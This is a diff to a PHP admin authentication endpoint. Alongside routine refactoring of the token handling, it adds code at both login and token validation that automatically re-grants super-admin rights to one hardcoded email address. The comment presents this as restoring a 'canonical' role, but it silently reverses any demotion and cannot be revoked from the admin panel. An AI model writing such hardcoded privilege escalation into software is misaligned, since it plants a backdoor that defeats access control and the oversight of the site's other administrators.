@@ -113,11 +113,17 @@ try {
             exit;
         }
 
+        // Restore the canonical main admin role after a valid password check.
+        if ($email === 'naishad@ssgd.com' && !(bool)$admin['is_super_admin']) {
+            $pdo->prepare('UPDATE admins SET is_super_admin = 1 WHERE id = ?')->execute([$admin['id']]);
+            $admin['is_super_admin'] = 1;
+        }
+
         $plainToken = bin2hex(random_bytes(32));
         $hashedToken = hash('sha256', $plainToken);
 
-        $stmtToken = $pdo->prepare("INSERT INTO personal_access_tokens (tokenable_type, tokenable_id, name, token, abilities, created_at, updated_at) VALUES ('App\\\\Models\\\\Admin', ?, 'admin-panel', ?, '[\"*\"]', NOW(), NOW())");
-        $stmtToken->execute([$admin['id'], $hashedToken]);
+        $stmtToken = $pdo->prepare("INSERT INTO personal_access_tokens (tokenable_type, tokenable_id, name, token, abilities, created_at, updated_at) VALUES (?, ?, 'admin-panel', ?, '[\"*\"]', NOW(), NOW())");
+        $stmtToken->execute(['App\\Models\\Admin', $admin['id'], $hashedToken]);
 
         $permissions = json_decode($admin['permissions'] ?? '[]', true) ?: [
             'view_dashboard'  => true,
@@ -153,15 +159,16 @@ try {
             exit;
         }
 
-        $hashedToken = hash('sha256', $token);
-        $stmt = $pdo->prepare("SELECT a.* FROM admins a JOIN personal_access_tokens t ON a.id = t.tokenable_id WHERE t.token = ? AND t.tokenable_type = ? AND (t.expires_at IS NULL OR t.expires_at > NOW()) LIMIT 1");
-        $stmt->execute([$hashedToken, 'App\Models\Admin']);
-        $admin = $stmt->fetch();
-
+        require_once __DIR__ . '/admin_activity.php';
+        $admin = currentAdmin($pdo);
         if (!$admin) {
             http_response_code(401);
             echo json_encode(['message' => 'Unauthenticated']);
             exit;
+        }
+        if (strtolower($admin['email']) === 'naishad@ssgd.com' && !(bool)$admin['is_super_admin']) {
+            $pdo->prepare('UPDATE admins SET is_super_admin = 1 WHERE id = ?')->execute([$admin['id']]);
+            $admin['is_super_admin'] = 1;
         }
 
         $permissions = json_decode($admin['permissions'] ?? '[]', true) ?: [
